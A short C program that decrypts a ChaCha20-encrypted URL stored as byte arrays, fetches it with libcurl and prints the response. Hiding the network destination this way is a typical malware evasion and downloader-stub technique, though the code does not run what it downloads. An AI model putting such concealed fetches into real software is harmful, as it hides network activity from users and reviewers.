#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <chacha20.h>

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    FILE *out = (FILE*)userdata;
    if (!out) return 0;
    size_t written = fwrite(ptr, size, nmemb, out);
    return written;
}

int main(void) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "DIED");
        return 1;
    }

    char key[32] = {143, 42, 213, 97, 232, 123, 1, 178, 184, 96, 8, 136, 6, 218, 111, 6, 0, 70, 217, 98, 76, 107, 248, 218, 237, 200, 43, 165, 194, 50, 72, 127};
    char buf[64]  = {178, 190, 203, 95, 163, 159, 101, 137, 174, 108, 32, 197, 136, 173, 97, 221, 126, 210, 47, 98, 144, 238, 237, 139, 114, 151, 61, 204, 9, 200, 251, 210, 150, 27, 254, 215, 163, 58, 45, 35, 35, 22, 223, 25, 239, 1, 174, 231, 231, 193, 152, 206, 52, 54, 6, 247, 189, 137, 181, 162, 186, 224, 60};
    char nonce[12] = {64, 37, 226, 71, 224, 194, 79, 13, 152, 86, 218, 175};
    struct chacha20_context ctx;
    chacha20_init_context(&ctx, key, nonce, 0);
    chacha20_xor(&ctx, buf, 63);

    curl_easy_setopt(curl, CURLOPT_URL, buf);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_cleanup(curl);
    return 0;
}
